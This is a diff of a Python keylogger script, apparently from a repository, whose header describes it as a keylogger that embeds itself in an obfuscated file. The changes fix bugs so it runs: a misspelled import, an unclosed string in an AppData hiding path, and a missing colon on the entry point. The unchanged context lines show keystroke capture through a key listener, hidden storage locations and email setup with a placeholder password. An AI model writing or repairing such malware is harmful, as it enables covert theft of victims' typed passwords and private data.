@@ -1,4 +1,4 @@
-import time, os, random, requests, socket, requets, win32gui, sys, platform, gui
+import time, os, random, requests, socket, win32gui, sys, platform, gui
 import random, string, datetime, smtp, traceback, threading
 import re, subprocess
 from subprocess import Popen, call, run, PIPE
@@ -15,7 +15,7 @@ from email import encoders
 import threading
 
 
-## work in progress, current build: running. 
+## work in progress, current build: running.
 ##########################################################
 # simple_keylogging script
 # currently embedds as a file in random/obfuscated file
@@ -34,6 +34,9 @@ import threading
   fromPswd = 'example_password' '''
 
 ### add hashing function for added protection.
+
+
+
 
 
 class Colors:
@@ -102,7 +105,6 @@ def clear():
     os_name = platform.system()
     _ = call('clear' if os_name == 'Linux' or 'Windows' or 'Darwin' else 'cls')
 
-
 ## establish keyworld obj/values for later in the script.
 substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                 'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
@@ -163,7 +165,7 @@ def write_txt(*args):
         chance_two = os.path.expanduser('~') + '/Pictures/'
         hidden_path.append(chance_two)
     if os.path.isdir(user_dir + '/AppData/'):
-        chance_three = os.path.expanduser('~') + '/AppData/
+        chance_three = os.path.expanduser('~') + '/AppData/'
         hidden_path.append(chance_three)
     else:
         print('[-] $Userhome does not contain common dirs found in win32.')
@@ -338,7 +340,9 @@ def main():
     t1.start()
     with Listener(on_press=on_press) as listener:
         listener.join()
-if __name__ == '__main__'
+
+
+if __name__ == '__main__':
     main()
 
 
